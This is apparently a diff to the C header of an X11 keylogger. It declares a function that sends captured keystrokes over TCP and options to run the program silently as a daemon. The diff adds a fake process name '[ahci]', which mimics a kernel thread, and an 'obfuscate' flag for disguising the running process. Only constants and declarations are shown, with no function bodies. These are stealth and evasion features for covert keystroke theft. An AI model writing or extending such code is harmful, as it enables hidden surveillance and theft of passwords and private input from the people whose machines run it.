@@ -20,6 +20,7 @@
 #define XKBD_WIDTH			32
 #define BYTE_LENGTH			8
 #define X_DEFAULT_DISPLAY	":0.0"
+#define PROCESS_FAKE_NAME	"[ahci]"
 
 #define TCP_PORT_MIN		0
 #define TCP_PORT_MAX		65535
@@ -43,6 +44,7 @@ struct opts_struct {
 
 	int   silent;			/* no log to stdout */
 	int   daemonize;		/* daemonize process */
+	int   obfuscate;		/* obfuscate process name */
 };
 
 /* globals */
@@ -107,7 +109,9 @@ void		fatal			(const char * msg);
 struct tm*	initialize		(int argc, char ** argv, struct opts_struct* opts);
 int			transmit_keystroke_inet(char* key, struct opts_struct *opts);
 void		log				(int level, FILE* stream, const char *fmt, ...);
-int			daemonize		();
+int			daemonize		(char* child_process_name);
+//int			daemonize		(char** argv, int argc);
+void*		smalloc			(size_t size);
 
 
 
